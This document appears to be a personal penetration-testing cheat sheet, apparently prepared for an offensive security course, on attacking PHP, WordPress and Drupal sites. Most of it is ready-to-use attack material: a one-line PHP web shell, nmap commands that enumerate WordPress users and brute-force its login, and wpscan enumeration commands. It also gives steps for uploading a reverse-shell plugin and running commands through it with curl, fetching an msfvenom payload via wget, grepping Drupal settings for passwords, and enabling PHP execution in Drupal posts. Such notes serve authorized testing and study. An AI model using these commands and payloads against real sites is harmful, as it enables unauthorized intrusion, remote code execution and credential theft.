# PHP

> PHP is a popular general-purpose scripting language that is especially suited to web development. It was originally created by Rasmus Lerdorf in 1994; the PHP reference implementation is now produced by The PHP Group.   
>
> -- <cite>[Wikipedia](https://en.wikipedia.org/wiki/PHP)</cite>

## General

### File inclusions (LFI & RFI)

[file inclusions (LFI & RFI)](bear://x-callback-url/open-note?id=E14A97D1-E258-4859-8830-ABEF17844D28-468-00000168B95D0042)

### Code Execution

PHP code execution
```php
<?php echo system($_REQUEST['cmd']); ?>
```

### PHP Type Confusion

( == vs === with 0e12345)  
[Type Juggling]

## Wordpress

[Attacking WordPress | HackerTarget.com](https://hackertarget.com/attacking-wordpress/)

### nmap

```bash
nmap -p80 --script http-wordpress-enum --script-args check-latest=true -vvv <ip>
```

```bash
nmap -p80 --script http-wordpress-users --script-args basepath=/wp/,limit=100 -vvv <ip>
```

```bash
nmap -sV --script http-wordpress-brute --script-args uri=/wp/wp-login.php -vvv <ip>
```
(may take some time)

### wpscan

WordPress Security Scanner  

Enumerate (PWK2.0 style)
```bash
wpscan -e ap,at,cb,dbe -o wpscan -f cli-no-color --url <url>
```

Enumerate users
```bash
wpscan -e u -o wpscan_users -f cli-no-color --url <url>
```

### Interesting files

[Web Security Geeks - The Security Blog: Pentesting CMS : Wordpress Joomla Drupal](https://www.websecgeeks.com/2015/11/pentesting-cms-wordpress-joomla-drupal.html)
```
Default files: “readme.html”, “license.txt”
Configuration file location: [examplesitefortesting.com]/wp-config.php
Administrator login location: [examplesitefortesting.com]/wp-login.php
Plugin location: [examplesitefortesting.com]/wp-content/plugins
```

### Install reverse shell plugin (authenticated)

```bash
/usr/share/seclists/Web-Shells/WordPress/plugin-shell.php
```

Zip the file
```bash
sudo zip plugin-shell.zip plugin-shell.php
```

Install the plugin  
Plugins -> Add New -> Upload Plugin -> Browse -> Install Now

execute command
```bash
curl <host>/wp-content/plugins/plugin-shell/plugin-shell.php?cmd=<cmd>
```

Get a full shell  
* Generate payload using msfvenom
* Upload via SimpleHTTPServer and wget (url encoding!)
* chmod +x 
* Execute

## Drupal

### droopescan

A plugin-based scanner that aids security researchers in identifying issues with several CMSs, mainly Drupal & Silverstripe.  
[GitHub - droope/droopescan](https://github.com/droope/droopescan)

```bash
droopescan scan drupal -u <ip>
```

Search for creds
```bash
./sites/default/settings | grep -i pass
```

### Interesting files

[Web Security Geeks - The Security Blog: Pentesting CMS : Wordpress Joomla Drupal](https://www.websecgeeks.com/2015/11/pentesting-cms-wordpress-joomla-drupal.html)
```
Default files: “CHANGELOG.txt”, “UPGRADE.txt”, “README.txt”
Configuration file location: [examplesitefortesting.com]/sites/default/settings.php
Plugin location: [examplesitefortesting.com]/?q=[pluginname]
```

### Authenticated

Activate php filter plugin to allow php code execution in posts
